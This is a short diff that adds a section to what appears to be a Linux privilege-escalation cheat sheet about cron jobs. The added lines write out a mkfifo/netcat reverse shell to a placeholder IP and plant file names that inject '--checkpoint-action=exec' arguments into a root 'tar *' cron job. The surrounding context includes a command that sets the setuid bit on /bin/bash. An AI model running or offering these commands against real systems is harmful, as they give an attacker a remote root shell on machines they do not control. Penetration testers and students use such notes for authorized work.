@@ -79,6 +79,14 @@ cat /etc/crontab
 ```
 ls -all /etc/cron.d
 ```
+
+### tar * running as Cron job
+```
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 1234 >/tmp/f" > shell.sh
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
+```
+
 ### if you find a cronjob running as root but can be editable run this command
 ```
 chmod u+s /bin/bash
